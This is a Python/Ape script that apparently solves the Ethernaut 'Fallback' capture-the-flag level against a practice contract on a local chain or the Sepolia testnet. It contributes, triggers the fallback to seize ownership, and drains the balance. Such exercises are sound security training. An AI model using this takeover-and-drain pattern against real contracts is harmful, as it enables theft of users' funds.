#!/usr/bin/python3
from ape import project, networks, accounts
from scripts.deploy import deploy_fallback
from scripts.helper_functions import get_account

# sepolia: 0x77923a4Ee93e210796C65e10419faE8A6c0569e4


def attack():
    if networks.active_provider.network.name == "local":
        fallback_contract = deploy_fallback()
        _, attacker = get_account()
    else:
        fallback_contract = project.Fallback.at("0x77923a4Ee93e210796C65e10419faE8A6c0569e4")
        attacker = accounts.load("ctf")

    #print(attacker.address)
    #exit(1)
    
    #print(fallback_contract.address)
    tx = fallback_contract.contribute(sender=attacker, value="0.000001 ether")

    #print(tx)

    print(fallback_contract.getContribution(sender=attacker))

    # invoke the fallback fn. & be the owner
    attacker.transfer(fallback_contract.address, "0.000001 ether")

    assert fallback_contract.owner() == attacker.address

    # drain the funds
    fallback_contract.withdraw(sender=attacker)

    print(f"Contract balacnce: {fallback_contract.balance}")

    assert fallback_contract.balance == 0



def main():
    attack()

if __name__ == "__main__":
    main()